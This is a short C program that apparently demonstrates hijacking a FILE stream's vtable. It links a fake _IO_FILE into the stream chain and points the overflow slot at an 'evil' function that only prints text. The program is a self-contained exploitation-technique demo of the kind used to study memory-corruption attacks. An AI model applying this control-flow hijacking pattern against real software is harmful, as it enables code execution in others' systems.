#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
struct _IO_FILE_plus {
	FILE file;
	size_t *vtable;
};
 
void evil_func(char *param) {
	printf("I am an evil function! >:)\n");
	printf("I can also take parameters %s\n", param);
}
 
int main() {
	struct _IO_FILE *real_fp = fopen("lorem_ipsum.txt", "w");
	struct _IO_FILE *fake_fp = malloc(sizeof(struct _IO_FILE_plus));
	((struct _IO_FILE_plus*) fake_fp)->vtable = calloc(21 ,8);
 
	// Linking
	fake_fp->_chain = real_fp->_chain; // not necessary
	real_fp->_chain = fake_fp;
	fake_fp->_IO_write_ptr = (char *) 1;
	fake_fp->_IO_write_base = (char *) 0;
	strcpy((char *) fake_fp, "hehehe...");
 
	// Setting overflow virtual function
	((struct _IO_FILE_plus*) fake_fp)->vtable[3] = (size_t) &evil_func;
}
